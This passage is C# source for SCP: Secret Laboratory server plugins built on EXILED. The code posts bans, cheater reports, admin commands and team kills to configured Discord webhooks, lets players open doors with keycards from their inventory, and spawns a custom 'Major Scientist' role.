		public Webhook(string webhookUrl)
		{
			_httpClient = new HttpClient();
			_webhookUrl = webhookUrl;
		}

		public Webhook(ulong id, string token) : this($"https://discordapp.com/api/webhooks/{id}/{token}")
		{
		}

		// ReSharper disable once InconsistentNaming
		public void Send(string content, string username = null, string avatarUrl = null, bool isTTS = false, IEnumerable<Embed> embeds = null)
		{
			Dictionary<string, string> discordToPost = new Dictionary<string, string>();
			Content = content;
			Username = username;
			AvatarUrl = avatarUrl;
			IsTTS = isTTS;
			Embeds.Clear();
			if (embeds != null)
			{
				Embeds.AddRange(embeds);
			}

			var contentdata = new StringContent(JsonConvert.SerializeObject(this), Encoding.UTF8, "application/json");

			var res = _httpClient.PostAsync(_webhookUrl, contentdata).Result;
			if (res.IsSuccessStatusCode)
			{
				Log.Debug("Posted message!");
			}
			else
			{
				Log.Error(res.Content.ToString());
			}
		}
	}
}
namespace MultiPlugin13
{
	[JsonObject]
	public class Embed : IEmbedUrl
	{
		[JsonProperty("title")]
		public string Title { get; set; }
		[JsonProperty("type")]
		public string Type { get; set; } = "rich";
		[JsonProperty("description")]
		public string Description { get; set; }
		public string Url { get; set; }
		[JsonProperty("timestamp")]
		public DateTimeOffset? TimeStamp { get; set; }
		[JsonProperty("color")]
		public int Color { get; set; }
		[JsonProperty("footer")]
		public EmbedFooter Footer { get; set; }
		[JsonProperty("image")]
		public EmbedImage Image { get; set; }
		[JsonProperty("thumbnail")]
		public EmbedThumbnail Thumbnail { get; set; }
		[JsonProperty("video")]
		public EmbedVideo Video { get; set; }
		[JsonProperty("provider")]
		public EmbedProvider Provider { get; set; }
		[JsonProperty("author")]
		public EmbedAuthor Author { get; set; }
		[JsonProperty("fields")]
		public List<EmbedField> Fields { get; set; } = new List<EmbedField>();
	}

	[JsonObject]
	public class EmbedFooter : IEmbedIconUrl, IEmbedIconProxyUrl
	{
		[JsonProperty("text")]
		public string Text { get; set; }
		public string IconUrl { get; set; }
		public string ProxyIconUrl { get; set; }
	}

	[JsonObject]
	public class EmbedImage : EmbedProxyUrl, IEmbedDimension
	{
		public int Height { get; set; }
		public int Width { get; set; }
	}

	[JsonObject]
	public class EmbedThumbnail : EmbedProxyUrl, IEmbedDimension
	{
		public int Height { get; set; }
		public int Width { get; set; }
	}

	[JsonObject]
	public class EmbedVideo : EmbedUrl, IEmbedDimension
	{
		public int Height { get; set; }
		public int Width { get; set; }
	}

	[JsonObject]
	public class EmbedProvider : EmbedUrl
	{
		[JsonProperty("name")]
		public string Name { get; set; }
	}

	[JsonObject]
	public class EmbedAuthor : EmbedUrl, IEmbedIconUrl, IEmbedIconProxyUrl
	{
		[JsonProperty("name")]
		public string Name { get; set; }
		public string IconUrl { get; set; }
		public string ProxyIconUrl { get; set; }
	}

	[JsonObject]
	public class EmbedField
	{
		[JsonProperty("name")]
		public string Name { get; set; }
		[JsonProperty("value")]
		public string Value { get; set; }
		[JsonProperty("inline")]
		public bool Inline { get; set; }
	}

	[JsonObject]
	public abstract class EmbedUrl : IEmbedUrl
	{
		public string Url { get; set; }
	}

	[JsonObject]
	public abstract class EmbedProxyUrl : EmbedUrl, IEmbedProxyUrl
	{
		public string ProxyUrl { get; set; }
	}

	[JsonObject]
	public interface IEmbedUrl
	{
		[JsonProperty("url")]
		string Url { get; set; }
	}

	[JsonObject]
	public interface IEmbedProxyUrl
	{
		[JsonProperty("proxy_url")]
		string ProxyUrl { get; set; }
	}

	[JsonObject]
	public interface IEmbedIconUrl
	{
		[JsonProperty("icon_url")]
		string IconUrl { get; set; }
	}

	[JsonObject]
	public interface IEmbedIconProxyUrl
	{
		[JsonProperty("proxy_icon_url")]
		string ProxyIconUrl { get; set; }
	}

	[JsonObject]
	public interface IEmbedDimension
	{
		[JsonProperty("height")]
		int Height { get; set; }
		[JsonProperty("width")]
		int Width { get; set; }
	}
}
namespace MultiPlugin13
{
	public class EventHandlers
	{
		public Plugin plugin;
		private string pingPongRoles;
		private string da;
		private string dq;
		public string reason;
		public EventHandlers(Plugin plugin) => this.plugin = plugin;

		public void ban(PlayerBannedEvent ev)
		{
			List<Embed> listEmbed = new List<Embed>();
			EmbedFooter reporterName = new EmbedFooter();
			reason = ev.Details.Reason;
		DateTime ExpireDate = new DateTime(ev.Details.Expires).AddHours(2);
		string FormattedDate = ExpireDate.ToString("dd/MM/yyyy HH:mm");
		Webhook webhk = new Webhook(plugin.banWebhookURL);
			Embed embed = new Embed();
			embed.Title = $"{plugin.server}: {plugin.Tessage}";
			embed.Description = $"\n> ~~-------------------------------------------~~" +
$"\n> {plugin.msgbanneduser}: {ev.Details.OriginalName} " +
$"\n> SteamID64: {ev.Details.Id} " +
$"\n> {plugin.msgbanissuer}: {ev.Details.Issuer} " +
$"\n> {plugin.msgreason}: {reason} " +
$"\n> {plugin.msgexpires}: {FormattedDate} " +
$"\n> ~~-------------------------------------------~~";
			embed.Footer = reporterName;


			listEmbed.Add(embed);
			if (string.IsNullOrWhiteSpace(plugin.banRoleIDsToPing)) webhk.Send(null, null, null, false, embeds: listEmbed);
			else
			{
				if (!plugin.banRoleIDsToPing.Contains(','))
				{
					webhk.Send("<@&" + plugin.banRoleIDsToPing + "> " + null, null, null, false, embeds: listEmbed);
				}
				else
				{
					string[] split = plugin.banRoleIDsToPing.Split(',');
					foreach (string roleid in split)
					{
						pingPongRoles += $"<@&{roleid.Trim()}> ";
					}
					webhk.Send(pingPongRoles + "" + null, null, null, false, embeds: listEmbed);
					pingPongRoles = "";
				}
			}
		}
		public void OnCheaterReport(ref CheaterReportEvent ev)
		{
			string Report = ev.Report;
			bool keywordFound = plugin.ignoreKeywords.Any(s => Report.IndexOf(s, StringComparison.OrdinalIgnoreCase) >= 0);
			if (keywordFound) return;
			ReferenceHub reportedPlayer = Player.GetPlayer(ev.ReportedId);
			ReferenceHub reportedBy = Player.GetPlayer(ev.ReporterId);

			if (reportedPlayer.characterClassManager.UserId == reportedBy.characterClassManager.UserId)
			{
				Extensions.Broadcast(reportedBy, 5, "Вы не можете кинуть репорт на себя");
				return;
			}

			Webhook webhk = new Webhook("https://discordapp.com/api/webhooks/");

			List <Embed> listEmbed = new List<Embed>();


			EmbedField reporterName = new EmbedField();
			reporterName.Name = "Репорт отправлен:";
			reporterName.Value = reportedBy.nicknameSync.MyNick + " " + reportedBy.characterClassManager.UserId;
			reporterName.Inline = true;

			EmbedField reporterUserID = new EmbedField();
			reporterUserID.Name = "SteamID отправителя:";
			reporterUserID.Value = reportedPlayer.characterClassManager.UserId;
			reporterUserID.Inline = true;

			EmbedField reportedName = new EmbedField();
			reportedName.Name = "Зарепорчен:";
			reportedName.Value = reportedPlayer.nicknameSync.MyNick;
			reportedName.Inline = true;

			EmbedField reportedUserID = new EmbedField();
			reportedUserID.Name = "Зарепорчен:";
			reportedUserID.Value = reportedPlayer.characterClassManager.UserId;
			reportedUserID.Inline = true;

			EmbedField Reason = new EmbedField();
			Reason.Name = "Причина";
			Reason.Value = ev.Report;
			Reason.Inline = true;

			Embed embed = new Embed();
			embed.Title = "Новый репорт";
			embed.Color = 1;
			embed.Fields.Add(reporterName);
			embed.Fields.Add(reporterUserID);
			embed.Fields.Add(reportedName);
			embed.Fields.Add(reportedUserID);
			embed.Fields.Add(Reason);


			listEmbed.Add(embed);


			if (string.IsNullOrWhiteSpace(plugin.RoleIDsToPing)) webhk.Send(plugin.CustomMessage, null, null, false, embeds: listEmbed);
			else
			{
				if (!plugin.RoleIDsToPing.Contains(','))
				{
					webhk.Send("<@&" + plugin.RoleIDsToPing + "> " + plugin.CustomMessage, null, null, false, embeds: listEmbed);
				}
				else
				{
					string[] split = plugin.RoleIDsToPing.Split(',');
					foreach (string roleid in split)
					{
						pingPongRoles += $"<@&{roleid.Trim()}> ";
					}
					webhk.Send(pingPongRoles + "" + plugin.CustomMessage, null, null, false, embeds: listEmbed);
					pingPongRoles = "";
				}
			}
		}
		public void RunOnRACommandSent(ref RACommandEvent ev)
		{
			ReferenceHub sender = ev.Sender.SenderId == "SERVER CONSOLE" || ev.Sender.SenderId == "GAME CONSOLE" ? PlayerManager.localPlayer.GetPlayer() : Player.GetPlayer(ev.Sender.SenderId);
			if (ev.Sender.SenderId == "SERVER CONSOLE" || ev.Sender.SenderId == "GAME CONSOLE")
			{
				return;
			}
			if (sender.characterClassManager.UserId == "-@steam") return;
			List<Embed> listEmbed = new List<Embed>();
			EmbedFooter reporterName = new EmbedFooter();
			Webhook webhk = new Webhook(plugin.raWebhookURL);
			Embed embed = new Embed();
			embed.Description = $"**{plugin.rasender}: {sender.GetNickname()}({sender.characterClassManager.UserId })* *\n" +
				$"{ev.Command}";
			embed.Footer = reporterName;


			listEmbed.Add(embed);
			if (string.IsNullOrWhiteSpace(plugin.raRoleIDsToPing)) webhk.Send(null, null, null, false, embeds: listEmbed);
			else
			{
				if (!plugin.raRoleIDsToPing.Contains(','))
				{
					webhk.Send("<@&" + plugin.raRoleIDsToPing + "> " + null, null, null, false, embeds: listEmbed);
				}
				else
				{
					string[] split = plugin.raRoleIDsToPing.Split(',');
					foreach (string roleid in split)
					{
						pingPongRoles += $"<@&{roleid.Trim()}> ";
					}
					webhk.Send(pingPongRoles + "" + null, null, null, false, embeds: listEmbed);
					pingPongRoles = "";
				}
			}

		}
		public void OnPlayerDie(ref PlayerDeathEvent ev)
		{
			if (ev.Player.queryProcessor.PlayerId == ev.Killer?.queryProcessor.PlayerId) return;
			if (ev.Killer.GetRole() == RoleType.None || ev.Killer.GetRole() == RoleType.Spectator || ev.Killer.GetRole() == RoleType.Scp079 || ev.Killer.GetRole() == RoleType.Scp0492 || ev.Killer.GetRole() == RoleType.Tutorial) return;
			if (ev.Player.GetRole() == RoleType.None || ev.Player.GetRole() == RoleType.Spectator || ev.Player.GetRole() == RoleType.Scp079 || ev.Player.GetRole() == RoleType.Scp0492 || ev.Player.GetRole() == RoleType.Tutorial) return;
			if (ev.Killer.GetTeam() == ev.Player.GetTeam())
			{
				if (ev.Killer.GetRole() == RoleType.ChaosInsurgency)
				{
					da = "Chaos";
				}
				if (ev.Killer.GetRole() == RoleType.Scp173)
				{
					da = "Scp173";
				}
				if (ev.Killer.GetRole() == RoleType.ClassD)
				{
					da = "ClassD";
				}
				if (ev.Killer.GetRole() == RoleType.Scp106)
				{
					da = "Scp106";
				}
				if (ev.Killer.GetRole() == RoleType.NtfScientist)
				{
					da = "NTF-Scientist";
				}
				if (ev.Killer.GetRole() == RoleType.Scp049)
				{
					da = "Scp049";
				}
				if (ev.Killer.GetRole() == RoleType.Scientist)
				{
					da = "Scientist";
				}
				if (ev.Killer.GetRole() == RoleType.Scp096)
				{
					da = "Scp096";
				}
				if (ev.Killer.GetRole() == RoleType.NtfLieutenant)
				{
					da = "Lieutenant";
				}
				if (ev.Killer.GetRole() == RoleType.NtfCommander)
				{
					da = "Commander";
				}
				if (ev.Killer.GetRole() == RoleType.NtfCadet)
				{
					da = "Cadet";
				}
				if (ev.Killer.GetRole() == RoleType.FacilityGuard)
				{
					da = "Guard";
				}
				if (ev.Killer.GetRole() == RoleType.Scp93953)
				{
					da = "Scp939";
				}
				if (ev.Killer.GetRole() == RoleType.Scp93989)
				{
					da = "Scp939";
				}

				if (ev.Player.GetRole() == RoleType.ChaosInsurgency)
				{
					dq = "Chaos";
				}
				if (ev.Player.GetRole() == RoleType.Scp173)
				{
					dq = "Scp173";
				}
				if (ev.Player.GetRole() == RoleType.ClassD)
				{
					dq = "ClassD";
				}
				if (ev.Player.GetRole() == RoleType.Scp106)
				{
					dq = "Scp106";
				}
				if (ev.Player.GetRole() == RoleType.NtfScientist)
				{
					dq = "NTF-Scientist";
				}
				if (ev.Player.GetRole() == RoleType.Scp049)
				{
					dq = "Scp049";
				}
				if (ev.Player.GetRole() == RoleType.Scientist)
				{
					dq = "Scientist";
				}
				if (ev.Player.GetRole() == RoleType.Scp096)
				{
					dq = "Scp096";
				}
				if (ev.Player.GetRole() == RoleType.NtfLieutenant)
				{
					dq = "Lieutenant";
				}
				if (ev.Player.GetRole() == RoleType.NtfCommander)
				{
					dq = "Commander";
				}
				if (ev.Player.GetRole() == RoleType.NtfCadet)
				{
					dq = "Cadet";
				}
				if (ev.Player.GetRole() == RoleType.FacilityGuard)
				{
					dq = "Guard";
				}
				if (ev.Player.GetRole() == RoleType.Scp93953)
				{
					dq = "Scp939";
				}
				if (ev.Player.GetRole() == RoleType.Scp93989)
				{
					dq = "Scp939";
				}
				List<Embed> listEmbed = new List<Embed>();
				EmbedFooter reporterName = new EmbedFooter();
				reporterName.Text = $"{plugin.tk}";
				Webhook webhk = new Webhook(plugin.tkWebhookURL);
				Embed embed = new Embed();
				embed.Title = $"{plugin.server}: {plugin.Tessage}";
				embed.Description = $"**{plugin.tk}**\n" +
					$"{plugin.killer}: {ev.Killer.characterClassManager.UserId}-{ev.Killer.characterClassManager.UserId}" +
					$"{da}" +
					$"{plugin.victim}: {ev.Player.characterClassManager.UserId}-{ev.Player.characterClassManager.UserId}" +
					$"{dq}";
				embed.Footer = reporterName;


				listEmbed.Add(embed);
				if (string.IsNullOrWhiteSpace(plugin.tkRoleIDsToPing)) webhk.Send(null, null, null, false, embeds: listEmbed);
				else
				{
					if (!plugin.tkRoleIDsToPing.Contains(','))
					{
						webhk.Send("<@&" + plugin.tkRoleIDsToPing + "> " + null, null, null, false, embeds: listEmbed);
					}
					else
					{
						string[] split = plugin.tkRoleIDsToPing.Split(',');
						foreach (string roleid in split)
						{
							pingPongRoles += $"<@&{roleid.Trim()}> ";
						}
						webhk.Send(pingPongRoles + "" + null, null, null, false, embeds: listEmbed);
						pingPongRoles = "";
					}
				}

			}
		}
	}
}
namespace MultiPlugin13
{
	public static class Extensions
	{
		public static void Broadcast(this ReferenceHub rh, ushort time, string message) =>
	rh.GetComponent<Broadcast>()
		.TargetAddElement(rh.scp079PlayerScript.connectionToClient, message, time, 0);
	}
}
namespace MultiPlugin13
{
	public class Plugin : EXILED.Plugin
	{
		public EventHandlers EventHandlers;
		public bool Enabled;
		public string WebhookURL;
		public string banWebhookURL;
		public string raWebhookURL;
		public string rasender;
		public string raRoleIDsToPing;
		public string RoleIDsToPing;
		public string banRoleIDsToPing;
		public string CustomMessage;
		public ulong banchannel;
		public string language;
		public bool decoremsg;
		public bool replacelowbars;
		public bool hasDiscordIntegration = false;
		public string msgconfigdis;
		public string msgconfigenabled;
		public string msgnodiscordint;
		public string msgnochanneldef;
		public string msgbanneduser;
		public string msgbanissuer;
		public string msgreason;
		public string msgexpires;
		public string langname;
		public string msgconfigreload;
		public string msgnoperm;
		public string Tessage;
		public List<string> ignoreKeywords;

		public string tkWebhookURL;
		public string tk;
		public string tkRoleIDsToPing;
		public string server;
		public string killer;
		public string victim;

		public override void OnEnable()
		{
			try
			{
				Enabled = Config.GetBool("mp_enable", true);
				WebhookURL = Config.GetString("mp_discord_webhook", "");
				banWebhookURL = Config.GetString("mp_discord_ban_webhook", "");
				raWebhookURL = Config.GetString("mp_discord_ra_webhook", "");
				rasender = Config.GetString("mp_discord_ra_sender", "Sender:");
				raRoleIDsToPing = Config.GetString("mp_discord_ra_roleids_ping", "");
				tkWebhookURL = Config.GetString("mp_discord_tk_webhook", "");
				tk = Config.GetString("mp_discord_tk_teamkill", "Team Kill");
				server = Config.GetString("mp_discord_tk_server", "Server");
				killer = Config.GetString("mp_discord_tk_killer", "killer");
				victim = Config.GetString("mp_discord_tk_victim", "Victim");
				tkRoleIDsToPing = Config.GetString("mp_discord_tk_roleids_ping", "");
				RoleIDsToPing = Config.GetString("mp_discord_roleids", "");
				banRoleIDsToPing = Config.GetString("mp_discord_ban_roleids_ping", "");
				CustomMessage = Config.GetString("mp_discord_custom_message", "Новый репорт!");
				Tessage = Config.GetString("server", "ff:off!");
				language = Config.GetString("mp_discord_language");
				ignoreKeywords = Config.GetStringList("mp_discord_ignorekeywords");

				if (string.IsNullOrWhiteSpace(WebhookURL) || !Enabled)
				{
					Log.Warn("There is no WebhookURL set in the config or you have disabled the plugin. Plugin is Disabled.");
					return;
				}
				LoadTranslations();
				EventHandlers = new EventHandlers(this);
				Events.CheaterReportEvent += EventHandlers.OnCheaterReport;
				Events.PlayerBannedEvent += EventHandlers.ban;
				Events.RemoteAdminCommandEvent += EventHandlers.RunOnRACommandSent;
				Events.PlayerDeathEvent += EventHandlers.OnPlayerDie;
			}
			catch (Exception e)
			{
				Log.Error($"There was an error loading the plugin: {e}");
			}
		}

		public override void OnDisable()
		{
			Events.CheaterReportEvent -= EventHandlers.OnCheaterReport;
			Events.PlayerBannedEvent -= EventHandlers.ban;
			Events.RemoteAdminCommandEvent -= EventHandlers.RunOnRACommandSent;
			Events.PlayerDeathEvent -= EventHandlers.OnPlayerDie;
			EventHandlers = null;
		}

		public override void OnReload()
		{
		}
		public void LoadTranslations()
		{
			switch (language)
			{
				case "en":
					{
						langname = "English";
						msgconfigdis = "Plugin is disabled by config.";
						msgconfigenabled = "Plugin has been loaded. Language: " + langname;
						msgnodiscordint = "DiscordIntegration plugin not found.";
						msgnochanneldef = "The ban channel is undefined.";
						msgbanissuer = "Banned by";
						msgbanneduser = "User";
						msgreason = "Reason";
						msgexpires = "Expires";
						msgconfigreload = "Configuration has been reloaded.";
						msgnoperm = "You don't have permission.";
						break;
					}
				case "es":
					{
						langname = "Español";
						msgconfigdis = "El plugin está desactivado en la configuración.";
						msgconfigenabled = "El plugin ha cargado. Lenguaje: " + langname;
						msgnodiscordint = "No se ha encontrado el plugin DiscordIntegration.";
						msgnochanneldef = "El canal de baneos no está definido.";
						msgbanissuer = "Baneado por";
						msgbanneduser = "Usuario";
						msgreason = "Razón";
						msgexpires = "Expira";
						msgconfigreload = "La configuración ha sido recargada.";
						msgnoperm = "No tienes permiso.";
						break;
					}
				case "fr":
					{
						langname = "Français";
						msgconfigdis = "Le plugin est désactivé dans les paramètres.";
						msgconfigenabled = "Le plugin a été chargé. Langue: " + langname;
						msgnodiscordint = "Plugin DiscordIntegration introuvable.";
						msgnochanneldef = "Le canal d'interdiction n'est pas défini.";
						msgbanissuer = "Interdit par";
						msgbanneduser = "Utilisateur";
						msgreason = "Raison";
						msgexpires = "Expire";
						msgconfigreload = "La configuration a été rechargée";
						msgnoperm = "Tu n'as pas la permission";
						break;
					}
				case "ja":
					{
						langname = "Japanese";
						msgconfigdis = "Plugin is disabled by config.";
						msgconfigenabled = "Plugin has been loaded. Language: " + langname;
						msgnodiscordint = "DiscordIntegration plugin not found.";
						msgnochanneldef = "The ban channel is undefined.";
						msgbanissuer = "禁止者";
						msgbanneduser = "ユーザー";
						msgreason = "理由";
						msgexpires = "期限";
						msgconfigreload = "Configuration has been reloaded.";
						msgnoperm = "You don't have permission.";
						break;
					}
				case "ch":
					{
						langname = "Chinese";
						msgconfigdis = "Plugin is disabled by config.";
						msgconfigenabled = "Plugin has been loaded. Language: " + langname;
						msgnodiscordint = "DiscordIntegration plugin not found.";
						msgnochanneldef = "The ban channel is undefined.";
						msgbanissuer = "被禁止由";
						msgbanneduser = "用户名";
						msgreason = "原因";
						msgexpires = "过期";
						msgconfigreload = "Configuration has been reloaded.";
						msgnoperm = "You don't have permission.";
						break;
					}
				case "ru":
					{
						langname = "Russian";
						msgconfigdis = "Plugin is disabled by config.";
						msgconfigenabled = "Plugin has been loaded. Language: " + langname;
						msgnodiscordint = "DiscordIntegration plugin not found.";
						msgnochanneldef = "The ban channel is undefined.";
						msgbanissuer = "Запрещенныйпо";
						msgbanneduser = "пользователь";
						msgreason = "причина";
						msgexpires = "истекает";
						msgconfigreload = "Configuration has been reloaded.";
						msgnoperm = "You don't have permission.";
						break;
					}
				case "pl":
					{
						langname = "Polish";
						msgconfigdis = "Wtyczka jest wyłączona w ustawieniach.";
						msgconfigenabled = "Plugin załadowany. Język: " + langname;
						msgnodiscordint = "Plugin DiscordIntegration nieznaleziony.";
						msgnochanneldef = "Kanał do banów niezdefiniowany.";
						msgbanissuer = "Zbanowany przez";
						msgbanneduser = "Użytkownik";
						msgreason = "Powód";
						msgexpires = "Wygasa";
						msgconfigreload = "Konfiguracja została ponownie załadowana.";
						msgnoperm = "Nie masz pozwolenia";
						break;
					}
				default:
					{
						langname = "English (Default)";
						msgconfigdis = "Plugin is disabled by config. Language is not defined.";
						msgconfigenabled = "Plugin has been loaded. Language: " + langname;
						msgnodiscordint = "DiscordIntegration plugin not found.";
						msgnochanneldef = "The ban channel is undefined.";
						msgbanissuer = "Banned by";
						msgbanneduser = "User";
						msgreason = "Reason";
						msgexpires = "Expires";
						msgconfigreload = "Configuration has been reloaded.";
						msgnoperm = "You don't have permission.";
						break;
					}
			}
		}
		public override string getName { get; } = "Multi Plugin";
	}
}
namespace MultiPlugin14
{
	public sealed class RemoteKeycard : Plugin
	{
		public const string _version = "1.4.1";

		private LogicHandler _logicHandler;

		public override string getName { get; } = "Multi Plugin";

		public RemoteKeycard()
		{
			_logicHandler = new LogicHandler(this);
		}

		public override void OnReload() { }

		public override void OnDisable()
		{
			Events.WaitingForPlayersEvent -= _logicHandler.OnWaitingForPlayers;
			Events.DoorInteractEvent -= _logicHandler.OnDoorAccess;
		}

		public override void OnEnable()
		{
			Events.WaitingForPlayersEvent += _logicHandler.OnWaitingForPlayers;
			Events.DoorInteractEvent += _logicHandler.OnDoorAccess;
		}

	}
}
namespace MultiPlugin14
{
	internal sealed class LogicHandler
	{
		private readonly Plugin _plugin;
		private List<ItemType> _allowedTypes;
		private int _allowedTypesHash;
		private Item[] _cache;

		public LogicHandler(Plugin plugin)
		{
			_plugin = plugin;
			_allowedTypes = null;
		}

		public void OnDoorAccess(ref DoorInteractionEvent ev)
		{
			if (ev.Allow != false || ev.Door.destroyed != false || ev.Door.locked != false)
				return;

			var playerIntentory = ev.Player.inventory.items;


			foreach (var item in playerIntentory)
			{
				if (_allowedTypes != null && _allowedTypes.Any() && !_allowedTypes.Contains(item.id))
					continue;

				var gameItem = GetItems().FirstOrDefault(i => i.id == item.id);

				// Relevant for items whose type was not found
				if (gameItem == null)
					continue;

				if (gameItem.permissions == null || gameItem.permissions.Length == 0)
					continue;

				foreach (var itemPerm in gameItem.permissions)
					if (ev.Door.backwardsCompatPermissions.TryGetValue(itemPerm, out var flag) && ev.Door.PermissionLevels.HasPermission(flag))
					{
						ev.Allow = true;
						continue;
					}
			}

		}

		public void OnWaitingForPlayers()
		{
			if (!Plugin.Config.GetBool("mp_enable"))
				_plugin.OnDisable();
			else
			{
				var arrayItems = Plugin.Config.GetString("rk_cards").Split(',');
				if (arrayItems == null || arrayItems.Length == 0 || _allowedTypesHash == arrayItems.GetHashCode())
					return;

				_allowedTypesHash = arrayItems.GetHashCode();
				var allowedItems = new List<ItemType>();
				ItemType allowedItem = ItemType.None;
				foreach (var item in arrayItems)
				{
					if (Enum.TryParse<ItemType>(item, true, out var enumedItem))
						allowedItem = enumedItem;
					else if (int.TryParse(item, NumberStyles.Number, CultureInfo.InvariantCulture, out var numericItem) && Enum.IsDefined(typeof(ItemType), numericItem))
						allowedItem = (ItemType)numericItem;

					if (allowedItem == ItemType.None)
						continue;

					allowedItems.Add(allowedItem);
				}
				_allowedTypes = allowedItems;
			}
		}

		public Item[] GetItems()
		{
			if (_cache == null)
				_cache = GameObject.FindObjectOfType<Inventory>().availableItems;
			return _cache;
		}
	}
}
namespace MultiPlugin15
{
	public class Plugin : EXILED.Plugin
	{
		private EventHandlers EventHandlers;

		public static HarmonyInstance harmonyInstance { private set; get; }
		public static int harmonyCounter;

		private bool enabled;

		public override void OnEnable()
		{
			enabled = Config.GetBool("mp_enabled", true);

			if (!enabled) return;

			harmonyCounter++;
			harmonyInstance = HarmonyInstance.Create($"THre.Major Scientist{harmonyCounter}");
			harmonyInstance.PatchAll();

			EventHandlers = new EventHandlers(this);

			// Register events
			Events.WaitingForPlayersEvent += EventHandlers.OnWaitingForPlayers;
			Events.RoundStartEvent += EventHandlers.OnRoundStart;
			Events.RoundEndEvent += EventHandlers.OnRoundEnd;
			Events.RoundRestartEvent += EventHandlers.OnRoundRestart;
			Events.PlayerDeathEvent += EventHandlers.OnPlayerDie;
			Events.CheckRoundEndEvent += EventHandlers.OnCheckRoundEnd;
			Events.CheckEscapeEvent += EventHandlers.OnCheckEscape;
			Events.SetClassEvent += EventHandlers.OnSetClass;
			_ = EventHandlers.Main();
			Events.ShootEvent += EventHandlers.OnShoot;
			Events.PlayerLeaveEvent += EventHandlers.OnPlayerLeave;
			Events.Scp106ContainEvent += EventHandlers.OnContain106;
			Events.PocketDimDeathEvent += EventHandlers.OnPocketDimensionDie;
			Events.UseMedicalItemEvent += EventHandlers.OnUseMedicalItem;
		}

		public override void OnDisable()
		{
			// Unregister events
			Events.WaitingForPlayersEvent -= EventHandlers.OnWaitingForPlayers;
			Events.RoundStartEvent -= EventHandlers.OnRoundStart;
			Events.RoundEndEvent -= EventHandlers.OnRoundEnd;
			Events.PlayerDeathEvent -= EventHandlers.OnPlayerDie;
			Events.CheckRoundEndEvent -= EventHandlers.OnCheckRoundEnd;
			Events.CheckEscapeEvent -= EventHandlers.OnCheckEscape;
			Events.SetClassEvent -= EventHandlers.OnSetClass;
			Events.PlayerLeaveEvent -= EventHandlers.OnPlayerLeave;
			Events.Scp106ContainEvent -= EventHandlers.OnContain106;
			Events.PocketDimDeathEvent -= EventHandlers.OnPocketDimensionDie;
			Events.UseMedicalItemEvent -= EventHandlers.OnUseMedicalItem;
			Events.ShootEvent -= EventHandlers.OnShoot;

			EventHandlers = null;
		}

		public override void OnReload() { }

		public override string getName { get; } = "Multi Plugin";
	}
}
namespace MultiPlugin15
{
	partial class EventHandlers
	{
		private static void KillMajorScientist()
		{
			if (hasTag) MajorScientist.RefreshTag();
			if (isHidden) MajorScientist.HideTag();
			Map.Broadcast(Configs.mdb, Configs.mdbt);

			if (Configs.log && true)
				Timing.CallDelayed(0.3f, () => Log.Info("Major Scientist is dead. Press F"));

			MajorScientist = null;
		}

		public static void SpawnMS(ReferenceHub MS)
		{
			if (MS != null)
			{


				if (Configs.dsreplace)
				{
					Timing.CallDelayed(0.2f, () => MS.ChangeRole(RoleType.Scientist));
				}

				MS.inventory.Clear();
				MS.AddItem(ItemType.KeycardScientistMajor);
				MS.AddItem(ItemType.SCP500);
				MS.AddItem(ItemType.GunCOM15);
				MS.AddItem(ItemType.Radio);
				MS.AddItem(ItemType.Flashlight);
				MS.AddItem(ItemType.Adrenaline);



				maxHP = MS.playerStats.maxHP;
				MS.playerStats.maxHP = Configs.health;
				MS.playerStats.Health = Configs.health;
				MS.ClearBroadcasts();
				MS.Broadcast(Configs.msb, Configs.msbt);
				hasTag = !string.IsNullOrEmpty(MS.serverRoles.NetworkMyText);
				isHidden = !string.IsNullOrEmpty(MS.serverRoles.HiddenBadge);
				if (isHidden) MS.RefreshTag();
				MS.SetRank(Configs.p, Configs.pc);

				MajorScientist = MS;

				if (Configs.log)
				{
					if (MajorScientist == null)
					{
						Log.Info("uh-oh, it seeme there's a problem with spawning MS..");
					}

				}
			}
		}

		public static void selectspawnMS()
		{

			if (true)
			{
				List<ReferenceHub> pList = Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scientist && x.characterClassManager.UserId != null && x.characterClassManager.UserId != string.Empty).ToList();

				if (Configs.dsreplace)
				{
					pList = Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.ClassD && x.characterClassManager.UserId != null && x.characterClassManager.UserId != string.Empty).ToList();
				}

				if (pList.Count > 0 && MajorScientist == null)
				{
					SpawnMS(pList[rand.Next(pList.Count)]);
				}

				Timing.CallDelayed(0.5f, () => MajorScientist.playerEffectsController.EnableEffect<CustomPlayerEffects.Scp207>());

				if (Configs.log)
					Log.Info("Major Scientist has spawned.");
			}
		}


		public static IEnumerator<float> DelayAction(float delay, Action x)
		{
			yield return Timing.WaitForSeconds(delay);
			x();
		}

	}
}
namespace MultiPlugin15
{
	public static class Extensions
	{

		public static void SetRank(this ReferenceHub player, string rank, string color = "default")
		{
			player.serverRoles.NetworkMyText = rank;
			player.serverRoles.NetworkMyColor = color;
		}
		public static void ChangeRole(this ReferenceHub player, RoleType role, bool spawnTeleport = true)
		{
			if (!spawnTeleport)
			{
				Vector3 pos = player.transform.position;
				Plugin.Info(pos.ToString());
				player.characterClassManager.SetClassID(role);
				Timing.RunCoroutine(EventHandlers.DelayAction(0.5f, () => player.playerMovementSync.OverridePosition(pos, 0)));
			}
			else
			{
				player.characterClassManager.SetClassID(role);
			}
		}
		public static void SetWeaponAmmo(this ReferenceHub rh, int amount)
		{
			rh.inventory.items.ModifyDuration(
			rh.inventory.items.IndexOf(rh.inventory.GetItemInHand()),
			amount);
		}

		public static void RefreshTag(this ReferenceHub player)
		{
			player.serverRoles.HiddenBadge = null;
			player.serverRoles.RpcResetFixed();
			player.serverRoles.RefreshPermissions(true);
		}

		public static void HideTag(this ReferenceHub player)
		{
			player.serverRoles.HiddenBadge = player.serverRoles.MyText;
			player.serverRoles.NetworkGlobalBadge = null;
			player.serverRoles.SetText(null);
			player.serverRoles.SetColor(null);
			player.serverRoles.RefreshHiddenTag();
		}

		public static void Broadcast(this ReferenceHub player, string message, ushort time, bool monospaced = false)
		{
			player.GetComponent<Broadcast>().TargetAddElement(player.scp079PlayerScript.connectionToClient, message, time, 0);
		}

	}
}

namespace MultiPlugin15
{
	partial class EventHandlers
	{
		public Plugin plugin;
		public EventHandlers(Plugin plugin) => this.plugin = plugin;

		internal static ReferenceHub MajorScientist;
		private static bool isHidden;
		private static bool hasTag;
		private bool isRoundStarted;
		private static int maxHP;
		private int MajorEscape = 0;
		private const float dur = 327;
		private static System.Random rand = new System.Random();
		private static int RoundEnds;
		private static int AlternativeEnds;
		internal static ReferenceHub MiscMember;

